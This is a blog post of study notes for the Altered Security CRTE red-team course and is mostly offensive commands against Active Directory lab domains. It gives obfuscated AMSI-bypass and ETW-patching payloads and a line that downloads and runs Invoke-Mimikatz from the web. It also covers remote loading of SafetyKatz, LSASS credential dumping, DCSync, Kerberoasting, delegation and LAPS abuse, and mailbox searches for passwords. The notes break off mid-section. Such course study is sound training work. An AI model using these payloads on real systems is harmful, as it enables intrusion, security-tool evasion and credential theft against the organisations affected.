---
layout: post
title: CRTE Notes
date: 2023-12-01
categories: [Cheatsheet, Study Notes, Altered Security]
tags: [Cheatsheet, Study Notes, Altered Security]
---
>   Source: [Altered Security](https://www.alteredsecurity.com/redteamlab)

# I. Offensive PowerShell

>   PowerShell is NOT `powershell.exe`. It is the `System.Management.Automation.dll`

### Different ways to access PowerShell

-   `[ADSI]`
-   `.NET Classes `- `System.DirectoryServices.ActiveDirectory`
-   Native Executable
-   `WMI` using PowerShell
-   `ActiveDirectory` Module

### PowerShell Detections

-   System-wide transcription
-   Script Block logging
-   AntiMalware Scan Interface (AMSI)
-   Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)

### Bypassing Execution Policy

>   It is NOT a security measure, it is present to prevent user from accidently executing scripts.

-   Several ways to bypass
    -   `powershell –ExecutionPolicy bypass`
    -   `powershell –c <cmd>`
    -   `powershell –encodedcommand`
    -   `$env:PSExecutionPolicyPreference="bypass"`

### Bypassing PowerShell Security with [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)

```powershell
# With admin privileges:
RunWithPathAsAdmin.bat

# With non-admin privileges:
RunWithRegistryNonAdmin.bat

# Type exit from the new PowerShell session to complete the clean-up.
```

### Bypassing AV Signatures for PowerShell

-   Typical steps to bypass signature based detections
    1.  Scan using `AMSITrigger`
    2.  Modify the detected code snippet
        -   Base64 Encode
        -   Hex Encode
        -   Concatenation
        -   Reversing String
    3.  Rescan using `AMSITrigger`
    4.  Repeat the steps 2 & 3 till we get a result as “`AMSI_RESULT_NOT_DETECTED`” or “`Blank`”

##### Base64 Encoding

```powershell
# Simple base64 encoding
PS:\> $Text = 'string to encode';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText

# Split Text, Base64 and then Concat
# Encoding Payload
PS:\> $Text = 'Amsi';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText

PS:\> $Text = 'Utils';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText

# Decoding Paylaod
PS:\> $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))

# Another example
# Encoding Payload
PS:\> $Text = 'amsi';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
PS:\> $Text = 'Init';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
PS:\> $Text = 'Failed';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText

# Decoding Paylaod
PS:\> $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA=')) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA=')))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA'))))
```

##### Hex Encoding

```powershell
# Encoding Payload
PS:\> "Hello World" | Format-Hex

# Decoding Payload
PS:\> $r = '48 65 6C 6C 6F 20 57 6F 72 6C 64'.Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_} 
PS C:\> $s
Hello World
```

##### Concatenation

```powershell
PS:\> 'AmsiUtils'

PS:\> 'Amsi' + 'Utils'
AmsiUtils
```

##### String Reversal

```powershell
# Encoding Payload
PS:\> (([regex]::Matches("testing payload",'.','RightToLeft') | foreach {$_.value}) -join '')
daolyap gnitset

# Decoding Payload
PS:\> (([regex]::Matches("daolyap gnitset",'.','RightToLeft') | foreach {$_.value}) -join '')
testing payload
```

###### Final payload for ASMI bypass

```powershell
# What we want
PS:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Replace AmsiUtils and amsiInitFailed with the base64 encoded payload and concat the rest of the string
PS:\> [Ref].Assembly.GetType($('System.Management.Automation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA=')) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA=')))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,$true)

# check if ASMI is bypassed
PS:\> IEX(iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

###### Final payload 2 for ASMI bypass

```powershell
PS:\> $w = 'System.Manag';$r = '65 6d 65 6e 74 2e 41 75 74 6f 6d 61 74 69 6f 6e 2e'.Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_};$c = 'Amsi'+'Utils';$assembly = [Ref].Assembly.GetType(('{0}{1}{2}' -f $w,$s,$c));$n = $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAA==')));$b = 'siIn';$k = (([regex]::Matches("deliaFti",'.','RightToLeft') | foreach {$_.value}) -join '');$field = $assembly.GetField(('{0}{1}{2}' -f $n,$b,$k),'NonPublic,Static');$field.SetValue($null,$true)

# $r = converting hexadecimal values to string `ement.Automation`
# $assembly = concat of System.Management.Automation and AmsiUtils
# $n = am
# $k = reverse the string to `itFailed`
# $field = concat of am + siIn + itFailed
```

### Patching Event Tracing For Windows

By disabling or manipulating ETW, we can prevent security tools from logging our actions or tracking our movement within a system.

##### Use Invoke-Obfuscation

```powershell
Invoke-Obfuscation> SET SCRIPT BLOCK [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)

Invoke-Obfuscation> ENCODING
# use AES encryption
Invoke-Obfuscation> ENCODING\5

# Copy encrypted payload
# Disable ASMI using final payload 2
# Paste encrypted payload
```

### Offensive .NET - AV Bypass Ofbuscation

```powershell
# Check malicious binary with ThreatCheck (https://github.com/rasta-mouse/ThreatCheck)
C:\> Threatcheck.exe -f Rubeus.exe

# Use ConfuserEx (GUI) to obfuscate binary launch (https://github.com/mkaring/ConfuserEx)
# In Project tab select the Base Directory where the binary file is located
# In Setting Tab, add the rule and edit the rule to select the preset as Normal
# In Protect tab click on the protect button

# Analyze with ThreatCheck again to make sure its obfuscated successfully
C:\> Threatcheck.exe -f RubeusObfuscated.exe
```

### Offensive .NET - Payload Delivery

```powershell
# We can use NetLoader (https://github.com/Flangvik/NetLoader) to deliver our binary payloads.
# It can be used to load binary from filepath or URL and patch AMSI & ETW while executing.
C:\Users\Public\> Loader.exe -path http://10.10.10.10/SafetyKatz.exe 

# Use AssemblyLoader.exe (https://github.com/KINGSABRI/AssemblyLoader) to load the NetLoader in-memory from a URL which then loads a binary from a filepath or URL
C:\Users\Public\> AssemblyLoad.exe http://10.10.10.10/Loader.exe -path http://10.10.10.10/SafetyKatz.exe
```

# II. Domain Enumeration

### PowerView Basic Enumeration

###### Get current domain

```powershell
Get-NetDomain
```

###### Get object of another domain

```poweshell
Get-NetDomain -Domain moneycorp.local
```

###### Get domain SID for the current domain

```powerhshell
Get-DomainSID
```

###### Get domain policy for the current domain

```powershell
Get-DomainPolicy
(Get-DomainPolicy)."system access"
```

###### Get domain policy for another domain

```powershell
(Get-DomainPolicy -domain moneycorp.local)."system access"
(Get-DomainPolicy -domain moneycorp.local)."kerberos policy"
(Get-DomainPolicy -domain moneycorp.local)."Privilege Rights"
# OR
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
(Get-DomainPolicy).PrivilegeRights #Check your privileges
```

###### Get domain controllers for the current domain

```powershell
Get-NetDomainController
```

###### Get domain controllers for another domain

```powershell
Get-NetDomainController -Domain moneycorp.local
```

###### Get a list of users in the current domain

```powershell
Get-NetUser
Get-NetUser -Username student1
```

###### Get list of all properties for users in the current domain

```powershell
Get-UserProperty
Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount
Get-UserProperty -Properties logoncount
Get-UserProperty -Properties badpwdcount
```

###### Search for a particular string in a user's attributes

```powershell
Find-UserField -SearchField Description -SearchTerm "built"
```

###### Get a list of computers in the current domain

```powershell
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData
```


###### Get all the groups in the current domain

```powershell
Get-NetGroup
Get-NetGroup -Domain <targetdomain>
Get-NetGroup -FullData
Get-NetComputer -Domain
```

###### Get all groups containing the word "admin" in group name

```powershell
Get-NetGroup *admin*
Get-NetGroup -GroupName *admin*
Get-NetGroup *admin* -FullData
Get-NetGroup -GroupName *admin* -Doamin moneycorp.local
```

###### Get all the members of the Domain Admins group

```powershell
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
#test the below command
#Get-NetGroupMember -GroupName "Domain Admins" -Properties * | select DistinguishedName,GroupCategory,GroupScope,Name,Members
```


###### Get the group membership for a user

```powershell
Get-NetGroup -UserName "student1"
```

###### List all the local groups on a machine (needs administrator privs on non-dc machines) 

```powershell
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
```

###### Get members of all the local groups on a machine (needs administrator privs on non-dc machines)

```powershell
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
```

###### Get actively logged users on a computer (needs local admin rights on the target)

```powershell
Get-NetLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
```

###### Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)

```powershell
Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
```

###### Get the last logged user on a computer (needs administrative rights and remote registry on the target)

```powershell
Get-LastLoggedon -ComputerName <servername>
```

###### Find shares on hosts in current domain.

```powershell
Invoke-ShareFinder -Verbose
```

###### Find sensitive files on computers in the domain

```powershell
Invoke-FileFinder -Verbose
```

###### Get all fileservers of the domain

```powershell
Get-NetFileServer
```

### PowerView GPO Enumeration

##### Get list of GPO in current domain.

```powershell
Get-NetGPO
Get-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local
Get-GPO -All (GroupPolicy module)
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html (Provides RSoP)
gpresult /R /V (GroupPolicy Results of current machine)
```

##### Get GPO(s) which use Restricted Groups or groups.xml for interesting users

```powershell
Get-NetGPOGroup 
```

##### Get users which are in a local group of a machine using GPO

```powershell
Find-GPOComputerAdmin -ComputerName student1.dollarcorp.moneycorp.local
```

##### Get machines where the given user is member of a specific group

```powershell
Find-GPOLocation -Username student1 -Verbose
```

##### Get OUs in a domain

```powershell
Get-NetOU -FullData
```

##### Get GPO applied on an OU. Read `GPOname` from `gplink` attribute from `Get-NetOU`

```powershell
Get-NetGPO -GPOname "{AB306569-220D-43FF-BO3B-83E8F4EF8081}"
Get-GPO -Guid AB306569-220D-43FF-B03B-83E8F4EF8081 (GroupPolicy module) 
```

### PowerView ACL Enumeration

##### Get the ACLs associated with the specified object (groups)

```powershell
Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs
```

##### Get the ACLs associated with the specified prefix to be used for search

```powershell
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```

##### We can also enumerate ACLs using `ActiveDirectory` module but without resolving GUIDs

```powershell
(Get-Acl "AD:\CN=Administrator, CN=Users, DC=dollarcorp, DC=moneycorp,DC=local").Access
```

##### Get the ACLs associated with the specified LDAP path to be used for search

```powershell
Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
```

##### Search for interesting ACEs

```powershell
Invoke-ACLScanner -ResolveGUIDs
```

##### Get the ACLs associated with the specified path

```powershell
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
```

### PowerView Trust Enumeration

##### Get a list of all domain trusts for the current domain

```powershell
Get-NetDomainTrust
Get-NetDomainTrust -Domain us.dollarcorp.moneycorp.local
```

##### Get details about the current forest

```powershell
Get-NetForest
Get-NetForest -Forest eurocorp.local
```

##### Get all domains in the current forest

```powershell
Get-NetForestDomain
Get-NetForestDomain -Forest eurocorp.local
```

##### Get all global catalogs for the current forest

```powershell
Get-NetForestCatalog
Get-NetForestCatalog -Forest eurocorp.local
```

##### Map trusts of a forest

```powershell
Get-NetForestTrust
Get-NetForestTrust -Forest eurocorp.local
```

##### Find all machines on the current domain where the current user has local admin access

```powershell
Find-LocalAdminAccess -Verbose
```

##### Find computers where a domain admin (or specified user/group) has sessions

```powershell
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```

##### To confirm admin access

```powershell
Invoke-UserHunter -CheckAccess
```

##### Find computers where a domain admin is logged-in

```powershell
Invoke-UserHunter -Stealth
```

##### Find computers where a domain admin (or specified user/group) has sessions

```powershell
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "StudentUsers"
```

##### Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess)

```powershell
Find-DomainUserLocation -CheckAccess
```

##### Find computers (File Servers and Distributed File servers) where a domain admin session is available.

```powershell
Find-DomainUserLocation –Stealth
```

# III. Local Privilege Escalation

### Service Path Privilege Escalation using PowerUp

##### Get services with unquoted paths and a space in their name.

```powershell
Get-ServiceUnquoted -Verbose
Get-WmiObject -class win32_service | select pathname (wmi command/lists all paths)
```

##### Get services where the current user can write to its binary path or change arguments to the binary

```powershell
Get-ModifiableServiceFile -Verbose
```

##### Get the services whose configuration current user can modify

```powershell
Get-ModifiableService -Verbose
```

#### Run all checks from :

###### PowerUp

```powershell
Invoke-Allchecks
```

###### BeRoot is an executable:

```powershell
.\beRoot.exe
```

###### Privesc:

```powershell
Invoke-PrivEsc
```

# IV. Lateral Movement

### Cmdlets [ `New-PSSession` ]

###### Connect to a PS-Session of a remote user

```powershell
Enter-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
```

##### Execute Stateful commands using `Enter-PSSession` ( persistence )

```powershell
$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
Enter-PSSession -Session $sess

[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> $proc = Get-Process
[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> exit

Enter-PSSession -Session $sess

[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> proc
Will list current process
```

### Cmdlets [ `Invoke-Command` ]

##### Execute Stateful commands using Invoke-Command ( persistence )

```powershell
$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```

##### Display allowed commands we can execute on remote machine

```powershell
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -command {get-command}
```

##### Write File using `ScriptBlock`

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}
```

##### Edit file using `ScriptBlock`

```powershell
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {((cat "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\msfvenom.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred
```

##### Command execution using command and `ScriptBlock`

```powershell
Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -command {whoami}
Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -ScriptBlock {whoami}
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -command {whoami}
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami}
```

##### File execution using `ScriptBlock`

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock{"C:\temp\mimikatz.exe"}
```

##### File execution using `FilePath`

```powershell
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath "C:\temp\mimikatz.exe"
```

##### Language Mode

```powershell
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
```

##### Execute locally loaded function on the remote machines

###### Example : **Hello.ps1**

```powershell
function hello
{
Write-Output "Hello from the function"
}
```

###### Now we can load the function on our machine

```powershell
. .\Hello.ps1
```

###### Now we can execute the locally loaded functions

```powershell
Invoke-Command -ScriptBlock ${function:hello} -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

##### In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way

```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list of servers>) -ArgumentList
```

##### Directly load function on the remote machines using FilePath

```powershell
$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
Invoke-Command -FilePath "C:\temp\hello.ps1" -Session $sess
Enter-PSSession -Session $sess

[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> hello
Hello from the function
```

##### Windows Tradecraft

-   PowerShell remoting supports the system-wide transcripts and deep script block logging.
-   We can use **winrs** in place of **PSRemoting** to evade the logging (and still reap the benefit of 5985 allowed between hosts)

```powershell
C:\> winrs -remote:server1 -u:server1\administrator - p:Pass@1234 hostname
```

# V. Dumping Credentials

### Lateral Movement [ `Invoke-Mimikatz`, `SafetyKatz`, `Rubeus.exe` ]

##### Dump credentials on a local machine

```powershell
Invoke-Mimikatz -DumpCreds
```

##### Dump credentials on multiple remote machines

```powershell
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```

##### OverPass-The-Hash : generate tokens from hashes

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'

# Invoke-Mimikatz using AES
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

# SafetyKatz
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"

# The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).

# Rubeus.exe
# Below doesn't need elevation
Rubeus.exe asktgt /user:administrator /rc4: /ptt

# Below command needs elevation
Rubeus.exe asktgt /user:administrator /aes256: /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

##### DCSync Attack

-   To extract credentials from the DC without code execution on it, we can use `DCSync`
-   To use the `DCSync` feature for getting `krbtgt` hash execute the below command with DA privileges for us domain
-   By default, Domain Admins privileges are required to run `DCSync`

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'

# SafetyKatz
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"

# SafetyKatz Old (For Windows 2020 Server)
SafetyKatz_old.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

### Other ways to extract creds from LSASS

##### Invoke-Mimikatz

###### 1. Dump credentials on a local machine using Mimikatz

```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

##### SafetyKatz & SharpKatz

###### 2. Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)

```powershell
SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"

# SafetyKatz Old (For Windows 2020 Server)
SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"
```

###### 3. Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality)

```powershell
SharpKatz.exe -Command ekeys
```

##### Dumpert

###### 4. Dump credentials using Dumpert (Direct System Calls and API unhooking)

```powershell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

##### pypykatz

###### 5. Using pypykatz (Mimikatz functionality in Python)

```powershell
pypykatz.exe live lsa
```

##### comsvcs.dll

###### 6. Using comsvcs.dll

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
```

>   Now Extract the creds from lsass dump

```powershell
# Run mimikatz
# set the location of the lsass dump
sekurlsa::minidump C:\AD\Tools\lsass.DMP

# get the debug privs
privilege::debug

# now get the ekeys
sekurlsa::ekeys
```

##### SharpKatz

###### 7. Using SharpKatz.exe to do DCSync Attack

```powershell
SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
```

# VI. Domain Privilege Escalation

### Kerberoast

##### Methodology

>   1.   Find service accounts.
>   2.   Request for their TGS.
>   3.   Check if kerberoastable and then get their hashes.
>   4.   Try to crack their hashes to get the service account’s password.

##### Find user accounts as Service accounts

```powershell
# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerView
Get-DomainUser -SPN

# Rubeus
# List Kerberoast stats
Rubeus.exe kerberoast /stats

# Request TGS
Rubeus.exe kerberoast /user:serviceaccount /simple

# Look for kerberoastable accounts that only supports RC4_HMAC to avoid detections
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec

# Kerberoast all possible accounts
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

##### Crack ticket using `tgsrepcrack`

```powershell
# Check if the ticket has been granted
klist.exe

# Export all tickets using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack the Service account password
python.exe .\tgsrepcrack.py .\10k-worst-passwords.txt
'.\2-40a10000-studentuser@USSvc~serviceaccount￾US.TECHCORP.LOCAL.kirbi
```



### Unconstrained Delegation

##### Methodology/Steps using PowerShell

>   1.  For an example we have machine pwn1 as an Unconstrained user; We are pwn0 and we got foot-hold/credentials/hashes for machine pwn2 who has local admin access for machine pwn1; Hence we can perform this attack
>   2.  Get a Powershell session as a different user using **"Over pass the hash"** attack if required (in this case its **pwn2/appadmin**)
>   3.  We can try searching for local admins it has access to using **Find-LocalAdminAccess -Verbose**
>   4.  Create a **New-PSSession** attaching to the **"Unconstrained user"**
>   5.  Enter the new session using **Enter-PSSession**
>   6.  Bypass the *AMSI*
>   7.  EXIT
>   8.  Load **Mimikatz.ps1** on the new session using **Invoke-command**
>   9.  Enter the new session using **Enter-PSSession** *again*
>   10.  Now we can get the admin token and save it to the disk
>   11.  Try and check if you have any file from a DA
>   12.  If not we can try to pull if there is any sessions logged on as *Administrator* as pwn0 using **Invoke-Hunter** then run the attack again
>   13.  Once we get an DA token we can Reuse the token using **Invoke-Mimikatz**
>   14.  Now we can access any service on the DC; Example **`ls \\dc-corp\C$`** or use **WMI-Commands** / **ScriptBlock:Not sure**

##### PowerView

###### Enumerate computers with Unconstrained Delegation

```powershell
Get-NetComputer -UnConstrained

# Ignore the domain controllers if they apeare in the list as they have Unconstrained Delegation enabled
```

###### Check if a token is available and save to disk

>   **Get admin token** After compromising the computer with UD enabled, we can trick or wait for an admin connection

```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

###### Reuse of the DA token

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt Administrator@krbtgt-DOMAIN.LOCAL.kirbi"'
```

##### Invoke-Hunter

###### Pull any sessions if logged on with administrator/ Printer Bug

```powershell
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

##### Methodology/Steps using Binaries

>   1.  Set Rubeus on monitor mode
>   2.  Run Print Bug using MS-RPRN or PetitPotman
>   3.  You will get the TGT on rubues
>   4.  Copy and inject that into memory using */ppt* or do it manually
>   5.  Now you can access the shares or do a DCSync Attack

------

##### Print Bug

###### 1. MS-RPRN

>   https://github.com/leechristensen/SpoolSample

```powershell
MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```

OR

###### 1. PetitPotam

>   https://github.com/topotam/PetitPotam

```powershell
PetitPotam.exe us-web us-dc

# PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC
```

##### Rubeus

###### 2. Capture the TGT and Jump or Run DCsync

```powershell
# Captute the TGT
Rubeus.exe monitor /interval:5

# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine
Rubeus.exe ptt /tikcet:

# OR use Invoke-Mimikatz
[IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi",[Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'

# Run DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

### Constrained Delegation

##### Methodology/Steps using PowerShell

>   1.  List all the users having Constrained Delegation
>   2.  Keep a note of the **msDS-AllowedToDelegateTo** value
>   3.  Request for a TGT using the hash of the user with CD using kekeo (Which me must have collected before)
>   4.  Keep a note of the TGT return ticket
>   5.  Now request a TGS with the 2nd step and 4th step values as parameters in */service* and */tgt*
>   6.  Keep a note of the TGS return Ticket
>   7.  Now we can inject the TGS return Ticket with **Inkove-Mimikatz**
>   8.  We can now list the file systems of that account. Example : **`ls \\dc-mysql\C$`** but *can not* use any **WMI-Commands**. We can use *ScriptBlock* to execute commands on the system.
>   9.  But if the user DC we can do the same process and then do a **DCSync** attack

##### PowerView

###### Enumerate users and computers with CD enabled

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

##### kekeo

###### Requesting a TGT

```powershell
tgt::ask /user:websvc /domain:domain.local /rc4:cc098f204c5887eaa8253e7c2749156f
tgt::ask /user:dcorp-adminsrv /domain:domain.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
```

###### Request a TGS

```powershell
tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:cifs/computer.domain.LOCAL
tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:time/computer.domain.LOCAL|ldap/computer.domain.LOCAL
```

##### Invoke-Mimikatz

###### Inject the ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS.kirbi"'
```

###### Execute DCSync

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

##### ScriptBlock

```powershell
Inoke-Command -ScriptBlock{whoami} -ComputerName us-mssql.us.techcorp.local
```

##### Methodology/Steps using Binaries

>   1.  Use Rubeus to request a TGS for the user and inject it into memory
>   2.  Remote login the machine using `winrs`

------

##### Rubeus

###### 1. Request for a `S4U`

```powershell
Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
```

###### 2. Remote login using `winrs`

```powershell
winrs -r:us-mssql cmd.exe
```

### LAPS (Local Administrator Password Solution)

##### Methodology/Steps

>   1.  Identify the user who can read the LAPS creds
>   2.  Identify the OU where LAPS is implemented and which user can read it
>   3.  After compromising the user who can read the LAPS, read the creds

------

##### PowerView

###### 1. To find users who can read the passwords in clear text machines in OUs

```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

###### 2. To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text

```powershell
# Using Active Directory module
.\Get-LapsPermissions.ps1

# Using LAPS module (can be copied across machines)
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

###### 3. Once we compromise the user which has the Rights, use the following to read clear-text password

```powershell
# Powerview
Get-DomainObject -Identity <targetmachine$> | select - ExpandProperty ms-mcs-admpwd

# Active Directory module
Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd

# LAPS module
Get-AdmPwdPassword -ComputerName <targetmachine>
```

### gMSA (group Managed Service Account)

page 148

### MS Exchange

##### Methodology/Steps

>   1.  Load in [MailSniper](https://github.com/dafthack/MailSniper) using powershell
>   2.  Enumerate and pull all the emails
>   3.  Save all the emails in a file called emails.txt
>   4.  Now check if you have access to any other emailboxes
>   5.  Check for data inside the email address where the body contains data like password or creds

------

##### MailSniper

###### 1. Enumerate all mailboxes

```powershell
Get-GlobalAddressList -ExchHostname us-exchange -verbose -UserName us\studentuser1 -password <password> -
```

###### 2. Enumerate all mailboxes we have access to (means current user)

```powershell
Invoke-OpenInboxFinder -EmailList C:\AD\Tools\emails.txt -ExchHostname us-exchange -verbose 
```

###### 3. Once we have identified mailboxes where we can read emails, use the following to read emails. The below command looks for terms like pass, creds, credentials from top 100 emails of :

```powershell
